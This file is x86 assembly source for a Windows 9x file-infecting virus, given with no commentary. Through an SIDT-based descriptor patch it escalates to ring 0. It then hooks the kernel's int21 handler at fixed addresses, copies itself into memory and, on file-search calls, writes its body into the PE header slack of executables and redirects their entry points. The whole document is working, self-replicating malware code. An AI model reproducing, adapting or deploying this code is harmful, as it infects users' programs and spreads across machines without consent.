
; kernel_int21:
; BFF712B9 51           push    ecx          ; 00
; BFF712BA 50           push    eax          ; 01
; BFF712BB 68 002A0010  push    002A0010h    ; 02 03 04 05 06
; BFF712C0 E8 0000010F  call    kernel_ord0  ; 07 08 09 0A 0B (kernel_i21x=8)
; BFF712C5 C3           ret                  ; 0C            (kernel_c1=10Fh)
; kernel_ord0:
; BFF713D4 ..           ...

bufsize                 equ     4096

kernel_myaddr           equ     0BFF70800h
kernel_ord0             equ     0BFF713D4h
kernel_int21            equ     0BFF712B9h
kernel_i21x             equ     8
kernel_c1               equ     (kernel_ord0-(kernel_int21+kernel_i21x+4))

                        p386
                        model   flat

                        .code
start:
                        mov     esi, eax                ; ESI = offset start

                        add     eax, [eax-4]
                        push    eax

                        push    edi                     ; EDI <-- LDT.base
                        sidt    [esp-2]
                        pop     edi

                        fild    qword ptr [edi]         ; save desriptor #0

                        lea     eax, [esi+r0proc-start]
                        stosd                           ; +0 WORD offs&0xFFFF
                        stosd                           ; +6 WORD offs>>16
                        mov     [edi-8+2], 0EE000028h   ; +2 DWORD sel./flags

                        int     00h                     ; call ring-0

                        ret

                        ; now in ring-0

r0proc:                 fistp   qword ptr [edi-8]       ; restore descr. #0
                        ;;
                        mov     edi, kernel_myaddr
                        mov     ecx, kernel_myaddr+hook-start-(kernel_int21+kernel_i21x+4)
                        xchg    ecx, dword ptr ds:[kernel_int21+kernel_i21x]
                        cmp     cl, kernel_c1 and 255
                        jne     r0exit
                        rep     movsb                   ; copy virus

r0exit:

                        ;;
                        iret                            ; back to ring3

                        ; now in ring-3

hook:
                        cmp     ax, 714Eh               ; hook it
                        jne     hookexit

infect:                 pusha                           ; save regs
                        enter   bufsize, 0

                        mov     esi, kernel_int21

                        mov     ax, 3D02h               ; openfile, r/w
                        call    esi                     ; int21
                        jc      infect_exit
                        xchg    ebx, eax                ; EBX = file handle

                        xor     ecx, ecx                ; ECX = bufsize
                        mov     ch, bufsize/256

                        mov     edx, esp

;                       lea     edx, [esi+ecx]          ; EDX=offset buf

                        mov     ah, 3Fh                 ; read buffer
                        call    esi                     ; int21

                        mov     ecx, [edx+3Ch]          ; ECX = mz.pe_ptr
                        cmp     ecx, eax                ; EAX = numread
                        jae     infect_close

                        add     ecx, edx               ; ECX=PE header offset

                        mov     eax, [ecx+54h]          ; pe_headersize
                        inc     [ecx+54h].byte ptr 1    ; pe_headersize+=256
                        lea     edi, [edx+eax-4]  ; EDI=our new location in buf
                        xchg    eax, [ecx+28h]       ; EAX <--> entrypointrva
                        sub     eax, [ecx+28h]

                        jle     infect_close
;                       int 3

                        xor     ecx, ecx
                        mov     cl, physsize           ; ECX = oldeip-start+4

                        pusha
                        xor     eax, eax
                        repz    scasb                   ; should be 0s

                        pushf
                        mov     ah, 42h                 ; AX=4200--seek begin
                        cdq
                        call    esi                     ; int21
                        popf

                        popa
                        jne     infect_close

                        stosd

                        push    esi
                        mov     si, kernel_myaddr and 65535
                        rep     movsb                   ; copy virus to buf
                        pop     esi

                        mov     ah, 40h                 ; write virus
                        mov     ch, bufsize/256         ; ECX = bufsize
                        call    esi                     ; int21

infect_close:
                        mov     ah, 3Eh                 ; close file
                        call    esi                     ; int21

infect_exit:
                        leave
                        popa                            ; restore regs

rt:
hookexit:
                        db      0E9h                  ; return to kernel_ord0
                        dw      kernel_ord0-(kernel_myaddr+($+4-start))

physend:
physsize                equ     $-start

                        dw      0                       ; hehe. FUCK OFF!!!

                        .data

                        db      3 dup (13,10),'--------------------------',13,10
                        db      'þ physsize = '
                        db      physsize/ 100 mod 10+'0'
                        db      physsize/  10 mod 10+'0'
                        db      physsize/   1 mod 10+'0'
                        db      ' bytes',13,10
                        db      '--------------------------',4 dup (13,10)

                        end     start
